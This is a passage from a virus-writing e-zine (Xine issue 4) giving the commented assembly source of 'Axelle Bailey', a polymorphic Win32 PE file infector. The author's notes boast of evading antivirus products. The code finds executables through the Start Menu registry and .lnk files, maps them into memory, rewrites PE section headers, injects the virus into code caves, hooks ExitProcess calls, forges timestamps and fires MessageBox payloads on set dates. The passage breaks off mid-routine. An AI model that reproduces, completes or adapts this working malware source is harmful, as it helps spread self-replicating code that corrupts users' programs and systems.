   ;                                        /-----------------------------\
   ;                                        | Xine - issue #4 - Phile 202 |
   ;                                        \-----------------------------/

   ;
   ;       AxelleBailey (c) IKX MegaWare 1999
   ;
   ; A Win32 PE Body-Polymorphic Mid-Infector using ExitPoint Tech...
   ;
   ;
   ; About the Axelle Bailey Virus
   ;
   ;   - As you can saw, avers have many problems with Midinfector, in fact,
   ; they can't perform a 100% sure disinfection of them. Despite of that, they
   ; can't clean infected programs. Now we see that they can't detect polymorphics
   ; midinfectors virus. So, I can't imagine how they will take that virus...
   ;
   ;   - When a Portable Exe is opened, it look the last section, if it's
   ; equal .reloc, then it overwrite it, else it add the virus size + 500 and
   ; rebuild sections, header and all the staff...
   ;
   ;   - This virus doesn't infect in a common way, in fact, he look first for
   ; cave, like a series of int 3 in the code segment, it happend often now,
   ; both of Microsoft and Borland software that are **Often** distributed.
   ;
   ;   - After it, the virus scan the import after ExitProcess or Exit. When
   ; found, it calculate where the adress will be in memory. After it scan for
   ; call dword ptr [x] or jump dword ptr [x]. If a call is found, it save the
   ; Adress of a call, if a jump dword ptr [x], then it rescan the code section
   ; for getting call to it
   ;
   ;   - If nothing found, then it scan near the entrypoint for call or jumps
   ;   if found, then they are hooked...
   ;
   ;   - When found, it generate a poly in memory, the poly will be droped in
   ; cave followed by jumps, so, I will be happy to see the emulation of this
   ; virus. I tested with NODice32 that is so powerfull hi Lethal ;). Nothing
   ; found. If there's no more cave, then it drop the poly after the code, it's
   ; why I put 500 of more size.
   ;
   ;   - Above all, this virus isn't really finished, but it's his first
   ; version, it have fixed most compatibility problems, but PE infectors are
   ; often unstable or sometime don't get control or such thing, you know the
   ; fuck...
   ;
   ; About Axelle Bailey:
   ;
   ;   mmm, Nothing to say...
   ;
   ; Caracteristics:
   ;
   ;           * On 9 Octobre it launch paylaod
   ;               Creating 2 times more Messagebox on closing 1
   ;           * On Friday 13, it display Greets screen (MessageBox)
   ;           * Have debug feature if c:\debug.txt present
   ;               Ask you if you want to infect PE
   ;           * Find PE via a new way, using explorer's registry
   ;               - EXEs in the Start Menu will be infected
   ;               - .lnk file analysis
   ;           * Alternate sometime and infect the Windows Directory
   ;           * Infect only 10 files per run
   ;           * Use of Memory Maped Files...
   ;           * Get API via the Upcase (ie:CFA for CreateFileA)
   ;           * Append virus to last section
   ;               * if last section name=.reloc then overwrite it
   ;           * Invisible mark in the PE header (No fixed string)
   ;           * Look for Int 3/NOP cave in the code
   ;           * If found drop poly over caves, else after the body
   ;           * Able to put part in code and part near virus body
   ;           * Drop a 32 bit poly with variable regs
   ;               * Poly assume rol/inc/dec/neg/not/add/sub/xor
   ;           * Look and hook for Call ExitProcess on code section
   ;               (the standard method)
   ;           * Look and hook for Call MSVCRT!exit on code section
   ;               (the win98 way of Exiting program)
   ;           * Look/recursive trace/hook ExitProcess call-to-jump-to
   ;               (specially for Borland compiled software)
   ;           * Look and hook for calls/jumps near the entrypoint
   ;               (for strange programs...)
   ;           * The virus can return to host(or api) via different
   ;               way , like Alicia

   .386
   locals
   .model flat

   extrn           ExitProcess:Proc
   extrn       ReadFile:Proc

   .data
   dummy           dd      ?

   .code

   HOST:       jmp start0
   HOST2:      push 0
           call ExitProcess

   virus_seg segment para public 'virus'
   assume cs:virus_seg

   Start0:
   start0:
   Start:
   start:
           pushad
   Odelta:     call    Delta0

   Delta0: pop ebp
       sub     ebp,offset Odelta+5             ; get delta

       push    dword ptr [Ebp+ReturnWay]   ; save return information
       push    dword ptr [ebp+ReturnData]  ; may be overwritten

       lea eax,[ebp+startlist]     ; get all Kernel32 apis
       mov dword ptr [ebp+TargetCRC],eax   ; and put then there
       lea eax,[ebp+crc_list]
       call    GetProcI            ; get kernel32 and inits apis

       lea eax,[ebp+dllname]
       call    LoadLibrary         ; load library

       push    eax
       mov     edx,eax

       lea eax,[ebp+advapilist]        ;
       mov dword ptr [ebp+TargetCRC],eax   ; put it there
       lea eax,[ebp+advapi]        ; name of apis
       call    GetProcB            ; get all apis needed
                           ; in advapi32.dll

       pop eax
       call    checkforunload          ; check if we have to unload
                           ; from the memory advapi32
       lea eax,[ebp+dllname2]
       call    LoadLibrary         ; lload User32

       push    eax
       mov     edx,eax

       lea eax,[ebp+userapilist]
       mov dword ptr [ebp+TargetCRC],eax   ; save it there
       lea eax,[ebp+userapi]       ; get the Messageboxa
       call    GetProcB            ; get it!

       pop eax
       call    checkforunload          ;

       jmp FindFirst00

   dllname:    db  'ADVAPI32.DLL',0
   dllname2:   db  'USER32.DLL',0

   LoadLibrary:

   mov byte ptr [ebp+unloadflag],0     ; reset unload flag

   push    eax
   push    eax
   call    dword ptr [ebp+GetModuleHandle]     ; check if the process have it
                           ; in his memory
   pop edx

   cmp eax,0
   jne thenwehavedll               ; if no

   push    edx
   call    dword ptr [ebp+LoadLibraryA]        ; then load it but we will
   mov byte ptr [ebp+unloadflag],1     ; have to unload it

   thenwehavedll:

   ret

   checkforunload:

   cmp byte ptr [ebp+unloadflag],1     ; check if we have to unload it
   jne thenskipunload

   push    eax
   call    dword ptr [ebp+FreeLibrary]     ; do it!

   thenskipunload:
   ret

   unloadflag: db  0

   crc_list:
   ApiList:

   db  'FFFA',0                    ; FindFirstFileA
   db  'FNFA',0                    ; FindNextFileA
   db  'CFA',0                     ; CreateFileA
   db  'CH',0                      ; CloseHandle
   db  'WF',0                      ; WriteFileA
   db  'RF',0                      ; ReadFileA
   db  'SFP',0                     ; SetFilePointer
   db  'SFT',0                     ; SetFileTime
   db  'GFS',0                     ; GetFileSize
   db  'CFMA',0                    ; CreateFileMapping
   db  'MVOF',0                    ; MapViewOfFile
   db  'UVOF',0                    ; UnMapViewOfFile
   db  'VA',0                      ; VirtualAlloc
   db  'VF',0                      ; VirtualFree
   db  'LLA',0                     ; LoadLibraryA
   db  'FC',0                      ; FindClose
   db  'FL',0                      ; FreeLibrary
   db  'GST',0                     ; GetSystemTime
   db  'CT',0                      ; CreateThread
   db  'GWDA',0                    ; GetWindowsDirectoryA
   db  'GCDA',0                    ; GetCurrentDirectoryA
   db  'SCDA',0                    ; SetCurrentDirectoryA
   db  'GMHA',0                    ; GetModuleHandleA
   db  'EP',0
   advapi:
   db  'ROKA',0                    ; RegOpenKeyA
   db  'RQVEA',0                   ; RegQueryValueExA
   db  'RCK',0                     ; RegCloseKey
   userapi:
   db  'MBA',0                     ; MessageBoxA
   db  -1                      ; Finish! :)))

   Greets: db  'The Axelle Bailey/iKx/ Virus - OreZRatS [Ikx] (C) 1999',10,13,10,13
       db  'Greets to: Reptile and SSR for the ideas',10,13
       db  '   Bozo for the motivations',10,13
       db  '   In honor of Axelle Bailey and',10,13,10,13
       db  'Dedicated to Federrico ;)',0

   debugtxt: db 'c:\debug.txt',0           ; debug file name
   debugopt: db 0

   payload0:                   ; this is for 1st run

       xor ebp,ebp
       call    payloadA            ; display the MessageBox
       push    0
       call    dword ptr [ebp+ExitProc]    ; finish the program

   payloadA:

       push    0
       lea eax,[ebp+Caption]       ; something, no importence in
       push    eax             ; fact...
       lea eax,[ebp+Greets]        ; greets
       push    eax
       push    0

       call    dword ptr [ebp+MessageBoxA] ; display the greets
       ret

   FindFirst00:

       lea eax,dword ptr [ebp+File_Data]
       push    eax
       call    dword ptr [ebp+GetSystemTime]   ; get date , time , etc etc...

       cmp word ptr [ebp+File_Data+4],5    ; check for friday
       jne timenext

       cmp word ptr [ebp+File_Data+6],13   ; 13 of the month
       jne timenext

       call    payloadA            ; if so then display the greets

   timenext:

       cmp word ptr [ebp+File_Data+2],10   ; if 9 octobre then
       jne timenext2

       cmp word ptr [ebp+File_Data+6],9    ; launch payload
       jne timenext2           ; an annoying one :]

           mov     dword ptr [ebp+omnione],0   ; reset all constants
           mov     dword ptr [ebp+Active],1
           mov     dword ptr [ebp+Theorical],1

   payload1:

           call    getdelpay       ; get delta coz we will be in
   getdelpay:  pop ebp         ; a new thread and value will
           sub ebp,offset getdelpay    ; change...

           inc     dword ptr [ebp+omnione]

           push    0
           lea     eax,[ebp+annoyingcode]
           push    eax
           lea     eax,[ebp+annoyinglabel]
           push    eax
           push    0
           call    dword ptr [ebp+MessageBoxA] ; display the annoying box

           dec     dword ptr [ebp+Active]      ; here we decrement if the ok
           mov     eax,dword ptr [ebp+Theorical]   ; button was pushed
           add     dword ptr [ebp+Theorical],eax   ; make two time more messagebox
           ;inc    dword ptr [ebp+Theorical]

   thencreatone:

           lea     eax,[ebp+identifier]
           push    eax
           push    0
           push    0
           lea     eax,[ebp+payload1]
           push    eax
           push    0
           push    0
           call    dword ptr [ebp+CreateThread]    ; create the new thread

           inc     dword ptr [ebp+Active]
           mov     eax,dword ptr [ebp+Theorical]
           cmp     dword ptr [ebp+Active],eax
           jne     thencreatone            ; and then do it

           jmp     payload1

   annoyingcode:   db  'A kiss to!',0
   annoyinglabel:  db      'A kiss to Axelle Bailey !',0   ; a kiss to this
   identifier: dd  79797979h           ; incredible wome
   omnione:    dd  0
   Active:     dd  1
   Theorical:  dd  1

   timenext2:

       mov byte ptr [ebp+debugopt],0       ; reset debug option
                               ; flag
       lea eax,[ebp+debugtxt]
       call    Open_File_F             ; try to open that file
       jz  thennodebug

       mov byte ptr [ebp+debugopt],1       ; if yah then set debug

   thennodebug:


       mov al,byte ptr [ebp+File_Data+12]      ;check is sec=min(and)8
       and al,8

       and byte ptr [ebp+File_Data+14],8
       cmp byte ptr [ebp+File_Data+14],al
       jne timenext3               ; if so then infect
                               ; windows dir
       mov eax,2048
       call    Alloc
       push    eax         ; just for saving the dirs etc...

       push    eax
       push    512
       call    dword ptr [ebp+GetCurrentDirectoryA]    ; save it

       pop eax         ;+4
       push    eax         ;-4

       add eax,512
       push    eax         ;-4
       push    512
       push    eax
       call    dword ptr [ebp+GetWindowsDirectoryA]    ; get the windows dir.
       call    dword ptr [ebp+SetCurrentDirectoryA]    ; set it as current

       pop eax         ;+4
       add eax,1024

       push    eax         ;-4
       push    eax
       lea eax,[ebp+searchfor]
       push    eax
       call    dword ptr [ebp+FindFirstFile]       ; search 1st file in it
       mov dword ptr [ebp+hourhandler],eax

   gotothere:

       pop edx
       push    edx                 ; save this for FFNext
       push    edx
       push    dword ptr [ebp+hourhandler]
       add edx,2Ch             ; point to name is DTA32
       call    Testinfect              ; infect it

       call    dword ptr [ebp+FindNextFile]
       cmp eax,0
       jne gotothere           ; if not zero then loop again

       pop eax
       sub eax,1024
       push    eax
       call    dword ptr [ebp+SetCurrentDirectoryA]    ; set the old directory

       jmp Error0                  ; return to host

   hourhandler:    dd  0
   searchfor:  db  '*.exe',0

   timenext3:

       call    FindFirst               ; search on the start
                               ; meny
   Error0:

       pop dword ptr [ebp+ReturnData]      ; reget all those
       pop eax                 ; datas
       add eax,ebp
       jmp eax                 ; jump over there...

   ;
   ; Initialise the apilist vio GetProcAddress
   ;

   GetProcB:
       push    ebp
       mov edi,edx
       mov     dword ptr [ebp+ApiNames],eax
       jmp getprocC            ; if not kernel32 dll

   GetProcI:
       push    ebp
       mov     dword ptr [ebp+ApiNames],eax    ; if 1st run with kernel

   ;
   ; Secure way to get kernel address from winNT - this coz kernel declared as
   ; Process...
   ;

   GetKernelI:

   mov     edi,dword ptr [ebp+startscan]
   mov esi,dword ptr [ebp+ImageBase]           ; get import in mem

   openscan:

   mov eax,dword ptr [edi+12]
   cmp eax,0
   je ApiFinishScan

   cmp dword ptr [esi+eax],'NREK'      ;'KERN'
   jne scannext2
   cmp dword ptr [esi+eax+4],'23LE'    ;'EL32'
   jne scannext2

   add esi,dword ptr [edi+16]
   mov esi,dword ptr [esi]

   foundloop1:

           cmp     dword ptr [esi],685421cdh       ; look for 'This'
           je      founded
           dec     esi
           jmp    foundloop1

   founded:
           cmp     word ptr [esi],'MZ'
           je      founded2
           cmp     word ptr [esi],'ZM'         ; looko for exe start
           je      founded2
           dec     esi
       jmp founded

   scannext2:
   add edi,20

   jmp openscan

   ApiFinishScan:

   sub     eax,-1
   pop ebp
   ret

   startscan:      dd 00405000h
   ImageBase:  dd 00400000h

   founded2:
           mov     dword ptr [ebp+startscan],esi
       mov edi,esi

   getprocC:

           mov     ebx,dword ptr [edi+3Ch]
           add     ebx,edi                         ; ebx point to the PE header
                                                   ; In fact it's allways PE
                           ; I skiped the MZ and PE
                           ; signature check coz if it's
                           ; not, Kernel can't be loaded :]
           mov     esi,dword ptr [ebx+120]         ; esi point to the Export
           lea     esi,[esi+edi]                   ; zone

           mov     ecx,dword ptr [esi+24]          ; ecx = number of export
           mov     ebx,dword ptr [esi+32]          ; ebx point to the name offset
           add     ebx,edi                         ; table

   Scanstring:


           mov     edx,dword ptr [ebx]             ; edi point to the 1st
           add     edx,edi                         ; name

   loophere:

       push    ebx
       push    ecx

       mov eax,dword ptr [esi+24]      ; get
       sub eax,ecx             ; name offset
       shl eax,2
       lea edx,[ebx+eax]
       mov edx,[edx]
       add edx,edi

       lea eax,[ebp+tazoffset]
       mov dword ptr [ebp+nameoffset],eax

           xor     eax,eax
           xor     ecx,ecx

           mov     al,byte ptr [edx]

   getnamecrc:

           mov     cl,byte ptr [edx]           ; look and take

           test    ecx,ecx
           jz      test_crcs               ; only upper case

           cmp     cl,91
           ja      dontputit

       push    esi
       mov esi,dword ptr [ebp+nameoffset]
       mov byte ptr [esi],cl
       mov byte ptr [esi+1],0
       inc byte ptr [ebp+nameoffset]       ; save it to buffer
       pop esi

   dontputit:

           inc     edx
           jmp     getnamecrc

   test_crcs:

       pop ecx
       push    ecx
       push    ebp

       inc edx
       mov eax,dword ptr [ebp+ApiNames]
       xor ebx,ebx
   doomed:
           cmp byte ptr [eax],-1           ; if name equal -1
       je  testnext                ; then finish

       lea edx,[ebp+tazoffset]         ; check buffer with
       call    testname                ; API list
       jc  itsokay21               ; if same then get

       inc     ebx
           jmp     doomed

   itsokay21:

           mov     eax,dword ptr [esi+24]
       sub eax,ecx             ; get VA of API
       shl eax,1

       push    ebx
           add     eax,dword ptr [esi+36]          ; table RVA
           add     eax,edi                         ; Add Rva
       xor ebx,ebx             ; set ebx to 0
       mov bx,word ptr [eax]       ;
       xchg    eax,ebx
       pop ebx

       shl eax,2

       add eax,dword ptr [esi+28]
       add eax,edi

       mov     eax,dword ptr [eax]     ; calculations
       add eax,edi
       dec     ebx

       pop ebp
       mov ecx,dword ptr [ebp+TargetCRC]
       lea ecx,[4*ebx+ecx]
       mov dword ptr [ecx+4],eax       ; put it over the table
       push    ebp
   testnext:
       pop ebp
       pop ecx
       pop ebx
       loop    loophere2

       pop     ebp
           ret

   loophere2:  jmp loophere

   testname:

   checkifcorrectname:

       push    esi
       push    edi

       mov esi,eax             ; this just test if eax$ = edx$
       mov edi,edx

       dec edi
       dec esi

   thatflag0:

       inc esi
       inc edi

       cmp byte ptr [esi],0
       je  thenbybye0

       push    eax
       mov al,byte ptr [esi]
       cmp byte ptr [edi],al
       pop eax
       jne thenboombybye

       jmp thatflag0

   thenbybye0:

       cmp byte ptr [edi],0
           jne     thenboombybye
       inc     esi
       inc     esi
       mov     eax,esi
       add eax,-1
           pop     edi
           pop     esi
           ret

   thenboombybye:

       cmp byte ptr [esi],0
           je      thenboomby0
       inc esi
       jmp thenboombybye

   thenboomby0:

       inc esi
       mov eax,esi
       xor edi,edi
       pop edi
       pop esi
       ret

   ApiNames:   dd  0
   TargetCRC:  dd  0
   nameoffset: dd  offset tazoffset
   tazoffset:  db  20 dup (0)

   FindFirst:

   mov byte ptr [ebp+Infectioncounter],0

   mov     eax,25000
   call    Alloc               ; alloc a lot for recursive scan
   cmp     eax,0               ; and directory tree
   jc      dontdothat
   mov dword ptr [ebp+pseudomem2],eax

   push    eax
   push    eax
   push    eax

   push    eax
   lea     eax,[ebp+RegName]       ; what we need
   push    eax
   push    80000001h
   call    dword ptr [ebp+RegOpenKeyA]     ; open the key
                           ; return the handle
   pop ebx
   mov eax,ebx

   add eax,4                   ; save handle
   mov dword ptr [eax],4096-8          ; fix where we need in memory
   push    eax
   add eax,8
   push    eax
   sub eax,4
   push    eax
   push    0
   lea     ecx,[ebp+SubRegName]            ; get the needed subkey
   push    ecx
   push    dword ptr [ebx]             ; push the hanlde
   call    dword ptr [ebp+RegQueryValueExA]

   pop eax
   push    dword ptr [eax]
   call    dword ptr [ebp+RegCloseKey]     ; and close the registry

   pop eax
   add eax,12

   loopit:

   mov     dword ptr [ebp+ShellDesktop],eax    ; init the directory got
   add eax,512
   mov dword ptr [ebp+Findit],eax      ; set that we want DTA32 on
   sub     eax,512                 ; 512 byte later than previous

   theninceax1st:
   inc     eax
   cmp     byte ptr [eax],0            ; get last caracter
   jne     theninceax1st

   cmp     byte ptr [eax-1],'\'            ;look if fixing it as directory
   je      thendontfixdir

   fixdir:

   mov     byte ptr [eax],'\'          ; then do it
   inc     eax

   thendontfixdir:

   mov dword ptr [ebp+FindZero],eax        ; Find Zero...

   mov     edi,eax
   lea     esi,[ebp+fixzone]
   mov     ecx,4
   repz    movsb

   thenjumpup:

   push    dword ptr [ebp+Findit]          ; get *.*
   push    dword ptr [ebp+ShellDesktop]
   call    dword ptr [ebp+FindFirstFile]       ; find in fact .lnk and dirs
   mov edx,eax

   testinext:

   mov eax,dword ptr [ebp+Findit]
   cmp byte ptr [eax+2ch],'.'          ; if . or .. found
   je  skiprecursive

   lea esi,[eax+2ch]               ; point to names

   call    infectINF               ; analysing inf files

   mov eax,dword ptr [eax]
   cmp eax,10h
   jne skiprecursive               ;if not a dir then dont go
                           ; deeper
   push    edx                 ; save infos for FFNext
   push    dword ptr [ebp+FindZero]

   cmp byte ptr [ebp+arboricol],7      ; scan only 6 directory deeply
   je  thengoup

   mov eax,dword ptr [ebp+Findit]
   add eax,1024
   mov dword ptr [ebp+Findit],eax      ; set where we want much datas

   mov edi,dword ptr [ebp+FindZero]

   thenincit:

   mov al,byte ptr [esi]
   mov byte ptr [edi],al

   inc esi
   inc edi
   cmp al,0
   jne thenincit               ; add the dir to the current
                           ; directory buffer
   dec     edi                 ; ie: c:\win\start\apps\ +
                           ; draw\     see ?
   mov eax,edi
   call    fixdir                  ; recursive scan

   mov eax,dword ptr [ebp+Findit]
   sub eax,1024
   mov dword ptr [ebp+Findit],eax      ; restore DTA32

   thengoup:

   pop dword ptr [ebp+FindZero]
   pop edx                 ; restore for ffnext

   skiprecursive:

   push    edx
   push    dword ptr [ebp+Findit]
   push    edx
   call    dword ptr [ebp+FindNextFile]        ; do findnext
   pop edx
   cmp eax,0
   jne testinext

   dontdothat:

   push    4000h
   push    2000
   push    dword ptr [ebp+pseudomem2]
   call    dword ptr [ebp+GlobalFree]      ; delocate memory...

   ret                     ; when finish then return

   infectINF:

   push    edx
   push    eax
   push    esi                 ; save for the boucle of
                           ; dir scan
   thatoom:
   inc esi
   cmp byte ptr [esi],0
   je  thatam
   cmp byte ptr [esi],'.'          ; look for .LNK or .lnk files
   jne thatoom

   cmp dword ptr [esi+1],'KNL'
   je  thatamok

   cmp dword ptr [esi+1],'knl'
   jne thatam

   thatamok:

   pop esi
   push    esi

   mov edi,dword ptr [ebp+FindZero]
   mov byte ptr [edi],'\'          ; set it as dir

   thenincitbis:

   mov al,byte ptr [esi]
   mov byte ptr [edi],al

   inc esi
   inc edi
   cmp al,0
   jne thenincitbis                ; copy file name

   mov eax,dword ptr [ebp+ShellDesktop]
   call    Open_File_F             ; open it
   jz  thatam                  ; problem ? skip !

   mov eax,2000
   call    Alloc                   ; allocate memory
   mov dword ptr [ebp+pseudomem],eax
   push    eax

   mov ecx,2000
   mov edx,eax
   call    Read_file               ; Read 2000 bytes

   push    0
   push    dword ptr [ebp+CurrentHandle]
   call    dword ptr [ebp+GetFileSize]     ; but scan only file length...

   mov     ecx,eax
   pop ebx
   push    ebx
   push    ecx

   add eax,ebx

   decitdecit:
   thatgooz:

   dec eax
   cmp word ptr [eax],'\:'         ; get the directory environment
   je  dectetdir               ; when found, just keep disk
   loop    decitdecit              ; variable

   pop eax
   pop ecx
   jmp finishscan

   driveletter:    dw  0

   dectetdir:

   dec eax
   mov bx,word ptr [eax]           ; detect it

   pop     ecx
   pop eax
   add eax,ecx

   thenscannext2:

   dec     eax
   cmp     dword ptr [eax],'exe'           ; look for exe,0 or EXE,0 in
   je  thenlookthisone             ; the lnk file

   cmp dword ptr [eax],'EXE'
   je  thenlookthisone             ; found the scan this file

   loop    thenscannext2               ; no found?

   jmp finishscan

   thenlookthisone:

   dec eax
   cmp word ptr [eax],'\:'         ; check what kind of
   je  thenlookthistwo             ; directory windows build
   cmp word ptr [eax],'\.'         ; in the lnk file
   je  thenlookthistwo             ; 3 possibility: nothing
   cmp byte ptr [eax],0            ;        the ..\
   je  thenlookthistwo2            ;        or the C:\
   loop    thenlookthisone

   jmp finishscan

   thenlookthistwo2:
   mov byte ptr [eax],'\'          ; if nothing then add $:\
   dec eax

   thenlookthistwo:

   dec eax                 ; add $:
   mov word ptr [eax],bx

   mov edx,eax
   call    Testinfect              ; test infection but infection
                           ; will not work with prebuilded
                           ; lnk on windows installing
   finishscan:                 ; :[

   push    4000h
   push    2000
   push    dword ptr [ebp+pseudomem]
   call    dword ptr [ebp+GlobalFree]      ; delocate memory...

   call    Close_file

   thatam:

   pop esi
   pop eax
   pop     edx
   ret

   Testinfect:

   push    dword ptr [ebp+CurrentHandle]       ; save handle of the .lnk file
   push    edx

   cmp byte ptr [ebp+Infectioncounter],10  ; check if we have infected 10
   je  thendontinfect

   cmp byte ptr [ebp+debugopt],1       ; look for debug option
   jne thendontdo

   push    1
   lea eax,[ebp+Caption]
   push    eax
   push    edx
   push    0

   call    dword ptr [ebp+MessageBoxA]     ; messageboxit with filename

   cmp eax,2                   ; if Cancel
   je  thendontinfect              ; then don't infect

   thendontdo:

   pop edx
   push    edx

       push    edx
           call    FindFirstFileF          ; get infos over the file
           pop     edx

           cmp     byte ptr [ebp+File_Data+4+4],01110111b
           je      Finished            ; look for time/date stamp

       mov eax,edx
           call    Open_File_F
           jz      Finished

           call    infection           ; test and infect it

       cmp dword ptr [ebp+File_Data+4],0
       jne thendontfixthat         ; see if valid time_stamp32

       mov eax,dword ptr [ebp+File_Data+4+8]   ; no then make it
       mov dword ptr [ebp+File_Data+4],eax
       mov eax,dword ptr [ebp+File_Data+4+8+4]
       mov dword ptr [ebp+File_Data+4+4],eax

   thendontfixthat:

           mov     byte ptr [ebp+File_Data+4+4],01110111b  ; set time stamp

           lea     eax,[ebp+File_Data+4+8+8]
           push    eax
           sub     eax,8                   ; from patched DTA32
           push    eax
           sub     eax,8
           push    eax
           push    dword ptr [ebp+CurrentHandle]

           call    dword ptr [ebp+SetFileTime]     ; set the new timestamp

   Finished:

       call    Close_file

   thendontinfect:

   pop edx
   pop dword ptr [ebp+CurrentHandle]           ; reput the handle

   ret


   Caption:    db  'VirusInfo - Ready for infection',0

   ; variables...

   Infectioncounter:   db  0
   arboricol:      db  0
   fixzone:                db      '*.*',0
   RegName:            db      'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
   SubRegName:     db  'Start Menu',0
   pseudomem:      dd  0
   pseudomem2:     dd  0
   ShellDesktop:       dd      0
   Findit:         dd  0
   FindZero:       dd  0

   ;
   ; Overwriters! OVERWRITING IS ThE SOLUTiON
   ; Yeah! OVERWRITIIIIIIIIIIIING!!!!
   ;

   handlesize1 equ     4096
   handlesize2 equ     256+Fin-Start+500+40

   infection:

   call    mapit
   mov esi,eax             ; map the file in memory

   ;cmp    eax,1000h
   ;jb thenproblem

   mov dword ptr [ebp+memory1],0

   cmp word ptr [eax],'ZM'     ; check if exe
   jne thenproblem

   cmp byte ptr [eax+24],'@'       ; check if windows
   jne thenproblem

   mov ebx,dword ptr [eax+03Ch]
   add ebx,eax
   mov dword ptr [ebp+PEBase],ebx  ; save memory location of PE header

   cmp word ptr [ebx],'EP'     ; check if PE
   jne thenproblem

   mov al,byte ptr [ebx+88]        ; check if
   add al,byte ptr [ebx+89]        ; file already infected
   cmp al,'S'
   je  thenproblem

   sub al,byte ptr [ebx+89]
   mov ah,'S'
   sub ah,al
   mov byte ptr [ebx+89],ah        ; the stamp is variable coz depend from
                       ; ebx+88

   mov eax,dword ptr [ebx+52]
   mov     dword ptr [ebp+ImageBase],eax   ; save Imagebase

   add eax,dword ptr [ebx+128]
   mov dword ptr [ebp+startscan],eax   ; save where to scanning import
   sub eax,dword ptr [ebx+128]

   lea edx,[ebx+0F8h]
   mov     dword ptr [ebp+SectionOffset],edx   ; and section offset

   call    Betadropvirus           ; look if we can drop a virus image
   cmp eax,-1              ; if so, rebuild header
   je  thenproblem         ; if not

   call    cavescanner         ; scan caves
   call    thahook             ; hook midinfection
   call    CreateProPoly           ; and drop poly
   jc  thenproblem

   ; now connect virus entry point and poly entrypoint

   mov edx,dword ptr [ebp+Fixupentry]
   mov eax,edx
   call    Offset2Address
   mov ebx,eax
   mov eax,dword ptr [ebp+NEWEntryPoint]   ; then we drop
   sub eax,ebx                 ; that value after
   sub eax,4                   ; this to have the call
   mov dword ptr [edx],eax         ; polyentrypoint

   inc byte ptr [ebp+Infectioncounter]

   Unload:

   call    UnloadMemory                ; unload memory

   thenproblem:

   call    unmapit                 ; un map the file
   ret

   UnloadMemory:

   cmp byte ptr [ebp+memory1],1        ; check if cavemem were loaded
   jne dontunloadmemory1

   push    4000h
   push    handlesize1
   push    dword ptr [ebp+memhandle1]
   call    dword ptr [ebp+GlobalFree]      ; unload the Cave memory

   dontunloadmemory1:

   cmp byte ptr [ebp+memory2],1        ; check if polymem were loaded
   jne dontunloadmemory2

   push    4000h
   push    handlesize2
   push    dword ptr [ebp+memhandle2]
   call    dword ptr [ebp+GlobalFree]      ; unload polymem

   dontunloadmemory2:

   ret

   ; variables...

   memhandle1: dd  0
   memhandle2: dd  0
   memory1:    db  0
   memory2:    db  0

   DropAddress:        dd  0
   DropOffset:     dd  0
   InfectorAddress:    dd  0
   InfectorPoly:       dd  0

   PEBase:         dd  0
   SectionOffset:      dd  0
   LastSection:
   LastSectionOffset:  dd  0

   Betadropvirus:

   mov     edi,dword ptr [ebp+PEBase]          ; get PE header
   mov     edx,dword ptr [ebp+SectionOffset]       ; and section header

   mov     dword ptr [ebp+DropAddress],eax         ; mov DropAddress ?
                       ; don't remember the use of that
   xor     ecx,ecx
   mov     cx,word ptr [edi+6]             ; get number of section

   mov     eax,edx                     ; eax point to section

   fixtozero:

   mov     dword ptr [eax+24],0
   mov     dword ptr [eax+28],0
   mov     dword ptr [eax+32],0

   add     eax,40

   loop    fixtozero                   ; nullify reloc on each
                               ; section
   sub     eax,40                      ; we are N(section)-1
   mov edx,eax

   cmp     dword ptr [eax],'ler.'                  ; if reloc ?
   je      thenoverwritelast

   thenappendlast:                     ; yeah overwrite it

   mov     eax,dword ptr [edx+12]
   add     eax,dword ptr [edx+16]
   mov     dword ptr [ebp+DropAddress],eax         ; set DropAddress
   mov     eax,dword ptr [edx+20]
   add     eax,dword ptr [edx+16]
   mov     dword ptr [ebp+DropOffset],eax          ; set DropOffset

   thengotolast:

   push    edx
   mov     ebx,edx
   xor     edx,edx

   mov     eax,dword ptr [ebx+16]              ; fixup the physical
   add     eax,fin-start+500               ; size of last section
   mov     ecx,dword ptr [edi+60]
   div     ecx
   inc     eax
   mul     ecx
   mov     dword ptr [ebx+16],eax

   xor edx,edx
   mov     eax,dword ptr [ebx+8]               ; fixup the virtual
   add     eax,fin-start+500               ; size of last section
   mov     ecx,dword ptr [edi+56]
   div     ecx
   inc     eax
   mul     ecx
   mov     dword ptr [ebx+8],eax

   xor edx,edx

   mov     eax,dword ptr [ebx+12]              ; set new image size
   add eax,dword ptr [ebx+8]
   add     eax,1000h

   ;add     eax,fin-start+500
   div     ecx
   inc     eax
   mul     ecx
   mov     dword ptr [edi+80],eax

   pop     edx

   mov     dword ptr [edx+36],0c0000040h           ; set as writable this
                               ; section
   mov     dword ptr [edi+160],0
   mov     dword ptr [edi+164],0

   ret

   thenoverwritelast:              ; so we don't overwrite
                           ;
   mov     eax,dword ptr [edi+160]
   cmp     eax,dword ptr [edx+12]
   jne     thenappendlast

   mov     dword ptr [ebp+DropAddress],eax
   call    Address2Offset
   sub eax,esi
   mov dword ptr [ebp+DropOffset],eax  ; fix drop offset = section offset

   jmp     thengotolast

   Offset2RVA:

   push    edx

   call    Offset2Address              ; call this one

   mov edx,dword ptr [ebp+PEBase]      ; add PEbase
   add eax,dword ptr [edx+52]

   pop edx
   ret

   Offset2Address:                 ; convert an offset to
                           ; an adress of pe
   push    ebx
   push    ecx
   push    edx

   mov edx,dword ptr [ebp+SectionOffset]   ; scan over sections

   thendetectnext:
   push    edx

   mov ecx,dword ptr [edx+20]          ; get where it start
   add ecx,esi
   mov edx,dword ptr [edx+16]          ; where it finish
   add edx,ecx
   dec edx

   cmp eax,edx
   ja  testnext01              ; scan if we are in

   cmp eax,ecx
   jb  testnext01              ; if not loop again

   pop edx

   sub eax,esi
   sub eax,dword ptr [edx+20]
   add eax,dword ptr [edx+12]          ; set the memory offset

   pop edx
   pop ecx
   pop ebx
   ret

   testnext01:

   pop edx                 ;look
   add edx,40
   cmp byte ptr [edx],0            ;next
   jne thendetectnext              ;section, if zero then don't...

   pop edx
   pop ecx
   pop ebx

   ret

   Address2Offset:

   push    edx ebx ecx

   mov edx,dword ptr [ebp+SectionOffset]       ; conver Address2Offset
   sub edx,40

   loopithere:

   add edx,40
   cmp byte ptr [edx],0
   je  thenitsnotcorrect

   mov ecx,dword ptr [edx+12]      ; load memory start of section
   mov ebx,ecx
   add ebx,dword ptr [edx+8]       ; load memory end of section
   dec ebx

   cmp eax,ebx
   ja  loopithere          ; if eax > Virtual Address

   cmp eax,ecx             ; if eax < RVA then not correct
   jb  loopithere

   loopithere0:

   mov ebx,dword ptr [edx+20]      ; add offset
